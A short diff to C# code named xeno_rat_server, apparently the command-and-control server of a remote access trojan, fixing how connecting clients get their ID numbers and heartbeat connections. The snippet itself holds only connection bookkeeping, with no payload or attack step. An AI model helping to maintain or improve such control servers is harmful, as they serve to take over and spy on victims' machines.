@@ -103,7 +103,8 @@ namespace xeno_rat_server
 
         private async Task OnConnect(Socket socket)
         {
-            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentCount, OnDisconnect);
+            int currentIdCount = currentCount++;
+            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, OnDisconnect);
             if (client == null) 
             {
                 try
@@ -119,10 +120,10 @@ namespace xeno_rat_server
             }
             if (client.SockType == 0)
             {
-                clients[currentCount] = client;
                 ListViewItem clientdata = null;
                 try
                 {
+                    clients[currentIdCount] = client;
                     clientdata = await GetAddInfo(client);
                 }
                 catch 
@@ -134,7 +135,7 @@ namespace xeno_rat_server
                     client.Disconnect();
                     return;
                 }
-                currentCount++;
+                //currentCount++;
                 Node HeartSock=await client.CreateSubNodeAsync(1);//create HeartBeat Node
                 if (HeartSock == null) 
                 {
